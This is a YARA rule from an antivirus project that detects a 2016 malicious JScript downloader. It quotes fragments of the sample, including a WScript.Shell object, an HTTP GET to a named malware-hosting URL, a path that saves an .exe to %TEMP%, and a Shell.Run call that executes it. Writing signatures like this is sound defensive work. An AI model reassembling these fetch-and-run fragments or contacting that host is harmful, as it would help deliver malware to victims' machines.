rule sig_20160329_9e1b2fbbd7922be61ba3b131b19a11ef {
  meta:
    description = "datamaliciousorder - file 20160329_9e1b2fbbd7922be61ba3b131b19a11ef.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "925ca14c8ea708462b2161c05cfcbf219d8364843a6127ffa45955e120435e00"

  strings:
    $s1  = "for (;;){WScript[V](Bd() * 11); if (xu[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s2  = "var N0 = function WY() {return WScript[G](\"WScript.Shell\");}(), fG = 11;" fullword ascii
    $s3  = "xu[s](\"GET\", \"http://pasticceriabonci.it/m1psa\", false);" fullword ascii
    $s4  = "function N(G0, n){v = v * 1; return G0 - n;};" fullword ascii
    $s5  = "function c() {return N0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"B5SDdiRAXo36Ca.exe\";};" fullword ascii
    $s6  = "function bh(){return \"\" + h;};" fullword ascii
    $s7  = "function m(DH){N0[\"Run\"](DH, v, v);};" fullword ascii
    $s8  = "function R() {return ((l == true) && (l == D)) ? 1 : v;};" fullword ascii
    $s9  = "function ma(gg) {var UH = (1, 2, 3, 4, 5, gg); return UH;};" fullword ascii
    $s10 = "function hE(){return G;};" fullword ascii
    $s11 = "function BN()" fullword ascii
    $s12 = "var JA = new this[\"Date\"]();" fullword ascii
    $s13 = "function Bd(){return 22;};" fullword ascii
    $s14 = "return N(y, tC);" fullword ascii
    $s15 = " while (A){" fullword ascii
    $s16 = "var l = false;" fullword ascii
    $s17 = "l = true; " fullword ascii
    $s18 = "var Mw = false;" fullword ascii
    $s19 = "} catch(b){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}